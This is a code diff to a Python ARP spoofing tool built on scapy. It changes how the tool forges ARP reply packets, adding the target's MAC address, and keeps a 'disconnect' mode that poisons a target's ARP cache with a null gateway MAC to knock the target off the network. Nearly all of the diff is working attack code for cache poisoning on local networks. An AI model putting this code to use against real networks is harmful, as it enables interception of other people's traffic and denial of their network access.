@@ -1,5 +1,5 @@
 import threading
-from scapy.all import ARP, Ether, send, sendp
+from scapy.all import *
 import time
 
 from src.log import log
@@ -68,8 +68,8 @@ class ARP_Spoofer(threading.Thread):
             if self.disconnect: p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
             else:               p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway)
         else:
-            if self.disconnect: p = ARP(pdst=self.target, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
-            else:               p = ARP(pdst=self.target, psrc=self.gateway)
+            if self.disconnect: p = ARP(pdst=self.target, psrc=self.gateway, hwdst=getmacbyip(self.target), hwsrc="00:00:00:00:00:00")
+            else:               p = ARP(pdst=self.target, psrc=self.gateway, hwdst=getmacbyip(self.target))
         
         return p
     
@@ -84,10 +84,10 @@ class ARP_Spoofer(threading.Thread):
     
         a = self._make_packet()
         
+        
         if a.haslayer("Ether"): my_send = sendp
         else:                   my_send = send
             
-        
         if self.timeout:
             resting_timeout = self.timeout
             while resting_timeout > 0 and not self.exit_event.is_set():
